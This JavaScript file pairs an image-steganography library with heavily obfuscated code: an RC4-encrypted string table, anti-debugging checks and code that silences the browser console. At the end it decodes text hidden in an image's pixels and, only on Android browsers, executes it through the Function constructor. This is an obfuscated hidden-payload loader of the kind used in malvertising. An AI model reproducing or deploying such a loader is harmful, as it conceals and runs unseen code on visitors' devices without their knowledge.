"use strict";
!(function(name, context, definition) {
  if ("undefined" != typeof module && module.exports) {
    module.exports = definition();
  } else {
    if ("function" == typeof define && define.amd) {
      define(definition);
    } else {
      context[name] = definition();
    }
  }
})("steg", this, function() {
  /**
   * @return {undefined}
   */
  var Cover = function() {};
  var util = {
    isPrime: function(n) {
      if (isNaN(n) || !isFinite(n) || n % 1 || 2 > n) {
        return false;
      }
      if (n % 2 === 0) {
        return 2 === n;
      }
      if (n % 3 === 0) {
        return 3 === n;
      }
      /** @type {number} */
      var r = Math.sqrt(n);
      /** @type {number} */
      var i = 5;
      for (; r >= i; i = i + 6) {
        if (n % i === 0) {
          return false;
        }
        if (n % (i + 2) === 0) {
          return false;
        }
      }
      return true;
    },
    findNextPrime: function(n) {
      /** @type {number} */
      var i = n;
      for (; true; i = i + 1) {
        if (util.isPrime(i)) {
          return i;
        }
      }
    },
    sum: function(fn, val, options) {
      /** @type {number} */
      var read = 0;
      options = options || {};
      var i = options.start || 0;
      for (; val > i; i = i + (options.inc || 1)) {
        read = read + (fn(i) || 0);
      }
      return 0 === read && options.defValue ? options.defValue : read;
    },
    product: function(callback, b, options) {
      /** @type {number} */
      var s = 1;
      options = options || {};
      var i = options.start || 0;
      for (; b > i; i = i + (options.inc || 1)) {
        /** @type {number} */
        s = s * (callback(i) || 1);
      }
      return 1 === s && options.defValue ? options.defValue : s;
    },
    createArrayFromArgs: function(args, index, len) {
      /** @type {!Array} */
      var ret = new Array(len - 1);
      /** @type {number} */
      var i = 0;
      for (; len > i; i = i + 1) {
        ret[i] = args(i >= index ? i + 1 : i);
      }
      return ret;
    },
    loadImg: function(data) {
      /** @type {!Image} */
      var imageData = new Image();
      return (imageData.src = data), imageData;
    }
  };
  return (
    (Cover.prototype.config = {
      t: 3,
      threshold: 1,
      codeUnitSize: 16,
      args: function(val) {
        return val + 1;
      },
      messageDelimiter: function(theta, n) {
        /** @type {!Array} */
        var delimiter = new Array(3 * n);
        /** @type {number} */
        var j = 0;
        for (; j < delimiter.length; j = j + 1) {
          /** @type {number} */
          delimiter[j] = 255;
        }
        return delimiter;
      },
      messageCompleted: function(data, i, threshold) {
        /** @type {boolean} */
        var done = true;
        /** @type {number} */
        var currentChunk = 0;
        for (; 16 > currentChunk && done; currentChunk = currentChunk + 1) {
          /** @type {boolean} */
          done = done && 255 === data[i + 4 * currentChunk];
        }
        return done;
      }
    }),
    (Cover.prototype.getHidingCapacity = function(image, options) {
      options = options || {};
      var config = this.config;
      var weight3 = options.width || image.width;
      var dx = options.height || image.height;
      var value = options.t || config.t;
      var magnitude = options.codeUnitSize || config.codeUnitSize;
      return ((value * weight3 * dx) / magnitude) >> 0;
    }),
    (Cover.prototype.encode = function(d, o, options) {
      if (o.length) {
        o = util.loadImg(o);
      } else {
        if (o.src) {
          o = util.loadImg(o.src);
        } else {
          if (!(o instanceof HTMLImageElement)) {
            throw new Error(
              "IllegalInput: The input image is neither an URL string nor an image."
            );
          }
        }
      }
      options = options || {};
      var config = this.config;
      var t = options.t || config.t;
      var length = options.threshold || config.threshold;
      var codeUnitSize = options.codeUnitSize || config.codeUnitSize;
      var iCharsAmount = util.findNextPrime(Math.pow(2, t));
      var gofX = options.args || config.args;
      var encodeWrap = options.messageDelimiter || config.messageDelimiter;
      if (!t || 1 > t || t > 7) {
        throw new Error(
          'IllegalOptions: Parameter t = " + t + " is not valid: 0 < t < 8'
        );
      }
      /** @type {!Element} */
      var canvas = document.createElement("canvas");
      var context = canvas.getContext("2d");
      /** @type {string} */
      canvas.style.display = "none";
      canvas.width = options.width || o.width;
      canvas.height = options.height || o.height;
      if (options.height && options.width) {
        context.drawImage(o, 0, 0, options.width, options.height);
      } else {
        context.drawImage(o, 0, 0);
      }
      var decM;
      var oldDec;
      var oldMask;
      var name;
      var a;
      var dec;
      var curOverlapping;
      var mask;
      var x;
      var j;
      var imageData = context.getImageData(0, 0, canvas.width, canvas.height);
      var data = imageData.data;
      /** @type {number} */
      var e = (codeUnitSize / t) >> 0;
      /** @type {number} */
      var overlapping = codeUnitSize % t;
      /** @type {!Array} */
      var content = [];
      /** @type {number} */
      x = 0;
      for (; x <= d.length; x = x + 1) {
        if (
          ((dec = d.charCodeAt(x) || 0),
          (curOverlapping = (overlapping * x) % t),
          curOverlapping > 0 && oldDec)
        ) {
          if (
            ((mask = Math.pow(2, t - curOverlapping) - 1),
            (oldMask =
              Math.pow(2, codeUnitSize) * (1 - Math.pow(2, -curOverlapping))),
            (name = (dec & mask) << curOverlapping),
            (a = (oldDec & oldMask) >> (codeUnitSize - curOverlapping)),
            content.push(name + a),
            x < d.length)
          ) {
            /** @type {number} */
            mask = Math.pow(2, 2 * t - curOverlapping) * (1 - Math.pow(2, -t));
            /** @type {number} */
            j = 1;
            for (; e > j; j = j + 1) {
              /** @type {number} */
              decM = dec & mask;
              content.push(decM >> ((j - 1) * t + (t - curOverlapping)));
              /** @type {number} */
              mask = mask << t;
            }
            if ((overlapping * (x + 1)) % t === 0) {
              /** @type {number} */
              mask = Math.pow(2, codeUnitSize) * (1 - Math.pow(2, -t));
              /** @type {number} */
              decM = dec & mask;
              content.push(decM >> (codeUnitSize - t));
            } else {
              if (t >= ((overlapping * (x + 1)) % t) + (t - curOverlapping)) {
                /** @type {number} */
                decM = dec & mask;
                content.push(decM >> ((e - 1) * t + (t - curOverlapping)));
              }
            }
          }
        } else {
          if (x < d.length) {
            /** @type {number} */
            mask = Math.pow(2, t) - 1;
            /** @type {number} */
            j = 0;
            for (; e > j; j = j + 1) {
              /** @type {number} */
              decM = dec & mask;
              content.push(decM >> (j * t));
              /** @type {number} */
              mask = mask << t;
            }
          }
        }
        oldDec = dec;
      }
      var i;
      var len;
      var count;
      var iTake;
      var array;
      var value = encodeWrap(content, length);
      /** @type {number} */
      i = 0;
      for (
        ;
        4 * (i + length) <= data.length && i + length <= content.length;
        i = i + length
      ) {
        /** @type {!Array} */
        array = [];
        /** @type {number} */
        x = 0;
        for (; length > x && x + i < content.length; x = x + 1) {
          /** @type {number} */
          iTake = 0;
          j = i;
          for (; length + i > j && j < content.length; j = j + 1) {
            /** @type {number} */
            iTake = iTake + content[j] * Math.pow(gofX(x), j - i);
          }
          /** @type {number} */
          array[x] = 255 - iCharsAmount + 1 + (iTake % iCharsAmount);
        }
        /** @type {number} */
        x = 4 * i;
        for (; x < 4 * (i + array.length) && x < data.length; x = x + 4) {
          data[x + 3] = array[(x / 4) % length];
        }
        /** @type {number} */
        count = array.length;
      }
      len = i + count;
      for (
        ;
        len - (i + count) < value.length &&
        4 * (i + value.length) < data.length;
        len = len + 1
      ) {
        data[4 * len + 3] = value[len - (i + count)];
      }
      /** @type {number} */
      x = 4 * (len + 1) + 3;
      for (; x < data.length; x = x + 4) {
        /** @type {number} */
        data[x] = 255;
      }
      return (
        (imageData.data = data),
        context.putImageData(imageData, 0, 0),
        canvas.toDataURL()
      );
    }),
    (Cover.prototype.decode = function(image, options) {
      if (image.length) {
        image = util.loadImg(image);
      } else {
        if (image.src) {
          image = util.loadImg(image.src);
        } else {
          if (!(image instanceof HTMLImageElement)) {
            throw new Error(
              "IllegalInput: The input image is neither an URL string nor an image."
            );
          }
        }
      }
      options = options || {};
      var config = this.config;
      var t = options.t || config.t;
      var cls = options.threshold || config.threshold;
      var codeUnitSize = options.codeUnitSize || config.codeUnitSize;
      var h = util.findNextPrime(Math.pow(2, t));
      var filter = (options.args || config.args,
      options.messageCompleted || config.messageCompleted);
      if (!t || 1 > t || t > 7) {
        throw new Error(
          'IllegalOptions: Parameter t = " + t + " is not valid: 0 < t < 8'
        );
      }
      /** @type {!Element} */
      var canvas = document.createElement("canvas");
      var context = canvas.getContext("2d");
      /** @type {string} */
      canvas.style.display = "none";
      canvas.width = options.width || image.width;
      canvas.height = options.width || image.height;
      if (options.height && options.width) {
        context.drawImage(image, 0, 0, options.width, options.height);
      } else {
        context.drawImage(image, 0, 0);
      }
      var i;
      var result;
      var event = context.getImageData(0, 0, canvas.width, canvas.height);
      var packet = event.data;
      /** @type {!Array} */
      var modMessage = [];
      if (1 === cls) {
        /** @type {number} */
        i = 3;
        /** @type {boolean} */
        result = false;
        for (; !result && i < packet.length && !result; i = i + 4) {
          result = filter(packet, i, cls);
          if (!result) {
            modMessage.push(packet[i] - (255 - h + 1));
          }
        }
      }
      /** @type {string} */
      var errorListOutput = "";
      /** @type {number} */
      var charCode = 0;
      /** @type {number} */
      var bitCount = 0;
      /** @type {number} */
      var mask = Math.pow(2, codeUnitSize) - 1;
      /** @type {number} */
      i = 0;
      for (; i < modMessage.length; i = i + 1) {
        /** @type {number} */
        charCode = charCode + (modMessage[i] << bitCount);
        bitCount = bitCount + t;
        if (bitCount >= codeUnitSize) {
          /** @type {string} */
          errorListOutput =
            errorListOutput + String.fromCharCode(charCode & mask);
          /** @type {number} */
          bitCount = bitCount % codeUnitSize;
          /** @type {number} */
          charCode = modMessage[i] >> (t - bitCount);
        }
      }
      return (
        0 !== charCode &&
          (errorListOutput =
            errorListOutput + String.fromCharCode(charCode & mask)),
        errorListOutput
      );
    }),
    new Cover()
  );
});
/** @type {!Array} */
var a = [
  "OcOOcmwqwqcOw6YY",
  "LMO2woLDi27CscKE",
  "w6AZw5DDkMKK",
  "wpLDvMKTcwEBNmLCpCEC",
  "wooTw4LDtENeT8ODfMOMGDJCLA==",
  "wp3DgHV6UA==",
  "IMO3woDDl2DCuQ==",
  "SsKQw4ozw4pp",
  "JyTCtcOi",
  "DAwvMsKuw5YFcE8=",
  "P8ORRsKNwoE=",
  "UMONw7HCpyNQwoLDnynCksKLJV7CsMKAw6/Dv2PCuw==",
  "wofDmTJ0WMOdT3zDoMKcwqzDrRoCwpBPwrBBwoxewqtMwrB7DADDlGoLw7HCpMO7",
  "P8OZf3o1wr8C",
  "w63CmjrCmlLDoMKN",
  "w6LCmjM=",
  "w6MKw4PDnQ==",
  "w6rCkDbCnFo=",
  "woQYw5DDng==",
  "wrnDsMOHJsOYKcKWw4LDoQ==",
  "w4R+wq12wqo=",
  "GhAkM8KAw50F",
  "wpLDvMKTcxofJg==",
  "w59uw4R0",
  "UsKJAgtYw6Q0",
  "w5jCmXlB",
  "w5pZesOQFRfDlQ==",
  "w5DDhcKywpXCqA==",
  "w4HDjyUaDsO6wpM="
];
(function(params, url) {
  /**
   * @param {?} selected_image
   * @return {undefined}
   */
  var fn = function(selected_image) {
    for (; --selected_image; ) {
      params["push"](params["shift"]());
    }
  };
  /**
   * @return {undefined}
   */
  var build = function() {
    var target = {
      data: {
        key: "cookie",
        value: "timeout"
      },
      setCookie: function(value, name, path, headers) {
        headers = headers || {};
        /** @type {string} */
        var cookie = name + "=" + path;
        /** @type {number} */
        var url = 0;
        /** @type {number} */
        url = 0;
        var key = value["length"];
        for (; url < key; url++) {
          var i = value[url];
          /** @type {string} */
          cookie = cookie + ("; " + i);
          var char = value[i];
          value["push"](char);
          key = value["length"];
          if (char !== !![]) {
            /** @type {string} */
            cookie = cookie + ("=" + char);
          }
        }
        /** @type {string} */
        headers["cookie"] = cookie;
      },
      removeCookie: function() {
        return "dev";
      },
      getCookie: function(match, href) {
        match =
          match ||
          function(canCreateDiscussions) {
            return canCreateDiscussions;
          };
        var v = match(
          new RegExp(
            "(?:^|; )" +
              href["replace"](/([.$?*|{}()[]\/+^])/g, "$1") +
              "=([^;]*)"
          )
        );
        /**
         * @param {!Function} bits
         * @param {number} callback
         * @return {undefined}
         */
        var decode = function(bits, callback) {
          bits(++callback);
        };
        decode(fn, url);
        return v ? decodeURIComponent(v[1]) : undefined;
      }
    };
    /**
     * @return {?}
     */
    var init = function() {
      /** @type {!RegExp} */
      var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
      return test["test"](target["removeCookie"]["toString"]());
    };
    /** @type {function(): ?} */
    target["updateCookie"] = init;
    /** @type {string} */
    var array = "";
    var C = target["updateCookie"]();
    if (!C) {
      target["setCookie"](["*"], "counter", 1);
    } else {
      if (C) {
        array = target["getCookie"](null, "counter");
      } else {
        target["removeCookie"]();
      }
    }
  };
  build();
})(a, 126);
/**
 * @param {string} i
 * @param {string} a
 * @return {?}
 */
var b = function(i, a) {
  /** @type {number} */
  i = i - 0;
  var key = a[i];
  if (b["KPKLDH"] === undefined) {
    (function() {
      var PL$14;
      try {
        var evaluate = Function(
          "return (function() " + '{}.constructor("return this")( )' + ");"
        );
        PL$14 = evaluate();
      } catch (h) {
        /** @type {!Window} */
        PL$14 = window;
      }
      /** @type {string} */
      var colorProps =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
      if (!PL$14["atob"]) {
        /**
         * @param {?} Y
         * @return {?}
         */
        PL$14["atob"] = function(Y) {
          var str = String(Y)["replace"](/=+$/, "");
          /** @type {number} */
          var i = 0;
          var y;
          var x;
          /** @type {number} */
          var n = 0;
          /** @type {string} */
          var pix_color = "";
          for (
            ;
            (x = str["charAt"](n++));
            ~x && ((y = i % 4 ? y * 64 + x : x), i++ % 4)
              ? (pix_color =
                  pix_color +
                  String["fromCharCode"](255 & (y >> ((-2 * i) & 6))))
              : 0
          ) {
            x = colorProps["indexOf"](x);
          }
          return pix_color;
        };
      }
    })();
    /**
     * @param {string} data
     * @param {!Object} fn
     * @return {?}
     */
    var testcase = function(data, fn) {
      /** @type {!Array} */
      var p = [];
      /** @type {number} */
      var u = 0;
      var b;
      /** @type {string} */
      var testResult = "";
      /** @type {string} */
      var tempData = "";
      /** @type {string} */
      data = atob(data);
      /** @type {number} */
      var val = 0;
      var key = data["length"];
      for (; val < key; val++) {
        /** @type {string} */
        tempData =
          tempData +
          ("%" + ("00" + data["charCodeAt"](val)["toString"](16))["slice"](-2));
      }
      /** @type {string} */
      data = decodeURIComponent(tempData);
      /** @type {number} */
      var i = 0;
      for (; i < 256; i++) {
        /** @type {number} */
        p[i] = i;
      }
      /** @type {number} */
      i = 0;
      for (; i < 256; i++) {
        /** @type {number} */
        u = (u + p[i] + fn["charCodeAt"](i % fn["length"])) % 256;
        b = p[i];
        p[i] = p[u];
        p[u] = b;
      }
      /** @type {number} */
      i = 0;
      /** @type {number} */
      u = 0;
      /** @type {number} */
      var PL$19 = 0;
      for (; PL$19 < data["length"]; PL$19++) {
        /** @type {number} */
        i = (i + 1) % 256;
        /** @type {number} */
        u = (u + p[i]) % 256;
        b = p[i];
        p[i] = p[u];
        p[u] = b;
        testResult =
          testResult +
          String["fromCharCode"](
            data["charCodeAt"](PL$19) ^ p[(p[i] + p[u]) % 256]
          );
      }
      return testResult;
    };
    /** @type {function(string, !Object): ?} */
    b["sSGzQw"] = testcase;
    b["UvyfIT"] = {};
    /** @type {boolean} */
    b["KPKLDH"] = !![];
  }
  var C = b["UvyfIT"][i];
  if (C === undefined) {
    if (b["osjREl"] === undefined) {
      /**
       * @param {?} array
       * @return {undefined}
       */
      var Array = function(array) {
        this["yhuGjs"] = array;
        /** @type {!Array} */
        this["RSLhQn"] = [1, 0, 0];
        /**
         * @return {?}
         */
        this["JWTCiF"] = function() {
          return "newState";
        };
        /** @type {string} */
        this["uxuAZy"] = "\\w+ *\\(\\) *{\\w+ *";
        /** @type {string} */
        this["pyeOIT"] = "['|\"].+['|\"];? *}";
      };
      /**
       * @return {?}
       */
      Array["prototype"]["ijHoQZ"] = function() {
        /** @type {!RegExp} */
        var test = new RegExp(this["uxuAZy"] + this["pyeOIT"]);
        /** @type {number} */
        var artistTrack = test["test"](this["JWTCiF"]["toString"]())
          ? --this["RSLhQn"][1]
          : --this["RSLhQn"][0];
        return this["EwWlht"](artistTrack);
      };
      /**
       * @param {?} canCreateDiscussions
       * @return {?}
       */
      Array["prototype"]["EwWlht"] = function(canCreateDiscussions) {
        if (!Boolean(~canCreateDiscussions)) {
          return canCreateDiscussions;
        }
        return this["cJhJoi"](this["yhuGjs"]);
      };
      /**
       * @param {?} saveNotifs
       * @return {?}
       */
      Array["prototype"]["cJhJoi"] = function(saveNotifs) {
        /** @type {number} */
        var fp = 0;
        var len = this["RSLhQn"]["length"];
        for (; fp < len; fp++) {
          this["RSLhQn"]["push"](Math["round"](Math["random"]()));
          len = this["RSLhQn"]["length"];
        }
        return saveNotifs(this["RSLhQn"][0]);
      };
      new Array(b)["ijHoQZ"]();
      /** @type {boolean} */
      b["osjREl"] = !![];
    }
    key = b["sSGzQw"](key, a);
    b["UvyfIT"][i] = key;
  } else {
    key = C;
  }
  return key;
};
var d = (function() {
  /** @type {boolean} */
  var c = !![];
  return function(object__360, function__361) {
    /** @type {!Function} */
    var loopend = c
      ? function() {
          if (function__361) {
            var cssobj = function__361["apply"](object__360, arguments);
            /** @type {null} */
            function__361 = null;
            return cssobj;
          }
        }
      : function() {};
    /** @type {boolean} */
    c = ![];
    return loopend;
  };
})();
var w = d(this, function() {
  /**
   * @return {?}
   */
  var intval = function() {
    return "dev";
  };
  /**
   * @return {?}
   */
  var getDOMPath = function() {
    return "window";
  };
  /**
   * @return {?}
   */
  var testcase = function() {
    /** @type {!RegExp} */
    var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
    return !test["test"](intval["toString"]());
  };
  /**
   * @return {?}
   */
  var _stringify = function() {
    /** @type {!RegExp} */
    var test = new RegExp("(\\\\[x|u](\\w){2,4})+");
    return test["test"](getDOMPath["toString"]());
  };
  /**
   * @param {!Object} p
   * @return {undefined}
   */
  var wrap = function(p) {
    /** @type {number} */
    var ms_controller = ~-1 >> (1 + (255 % 0));
    if (p["indexOf"]("i" === ms_controller)) {
      create(p);
    }
  };
  /**
   * @param {!Object} s
   * @return {undefined}
   */
  var create = function(s) {
    /** @type {number} */
    var n = ~-4 >> (1 + (255 % 0));
    if (s["indexOf"]((!![] + "")[3]) !== n) {
      wrap(s);
    }
  };
  if (!testcase()) {
    if (!_stringify()) {
      wrap("ind\u0435xOf");
    } else {
      wrap("indexOf");
    }
  } else {
    wrap("ind\u0435xOf");
  }
});
w();
var f = (function() {
  /** @type {boolean} */
  var g = !![];
  return function(value, deferred) {
    /** @type {!Function} */
    var store = g
      ? function() {
          if (deferred) {
            var mom = deferred[b("0x0", "Kb10")](value, arguments);
            /** @type {null} */
            deferred = null;
            return mom;
          }
        }
      : function() {};
    /** @type {boolean} */
    g = ![];
    return store;
  };
})();
var l = f(this, function() {
  /**
   * @return {undefined}
   */
  var value = function() {};
  var config;
  try {
    var evaluate = Function(b("0x1", ")ID3") + b("0x2", "3hyK") + ");");
    config = evaluate();
  } catch (p) {
    /** @type {!Window} */
    config = window;
  }
  if (!config[b("0x3", "^aQK")]) {
    config[b("0x4", "bxQ9")] = (function(json) {
      var _data = {};
      /** @type {function(): undefined} */
      _data[b("0x5", "bxQ9")] = json;
      /** @type {function(): undefined} */
      _data[b("0x6", "vH0t")] = json;
      /** @type {function(): undefined} */
      _data[b("0x7", "bxQ9")] = json;
      /** @type {function(): undefined} */
      _data[b("0x8", "jAUm")] = json;
      /** @type {function(): undefined} */
      _data["error"] = json;
      /** @type {function(): undefined} */
      _data[b("0x9", "SF81")] = json;
      /** @type {function(): undefined} */
      _data[b("0xa", "$KuR")] = json;
      return _data;
    })(value);
  } else {
    /** @type {function(): undefined} */
    config[b("0xb", "IfD@")]["log"] = value;
    /** @type {function(): undefined} */
    config[b("0xc", "%RuL")][b("0xd", "e9PJ")] = value;
    /** @type {function(): undefined} */
    config[b("0xe", "(fcQ")]["debug"] = value;
    /** @type {function(): undefined} */
    config["console"][b("0xf", "xBPx")] = value;
    /** @type {function(): undefined} */
    config[b("0x10", "yDXL")][b("0x11", "IDtv")] = value;
    /** @type {function(): undefined} */
    config[b("0x12", "oBBn")][b("0x13", "^aQK")] = value;
    /** @type {function(): undefined} */
    config[b("0x14", "F#*Z")][b("0x15", "vH0t")] = value;
  }
});
l();
var s = b("0x16", "%RuL");
var t = document[b("0x17", "jAUm")](b("0x18", "3hyK"));
/**
 * @return {undefined}
 */
t[b("0x19", "F#*Z")] = function() {
  try {
    var date = steg[b("0x1a", "OfTH")](t);
  } catch (v) {}
  if (
    Number(
      /\x61\x6e\x64\x72\x6f\x69\x64/i[b("0x1b", "JQ&l")](
        navigator[b("0x1c", "IfD@")]
      )
    )
  ) {
    s[s][s](date)();
  }
};
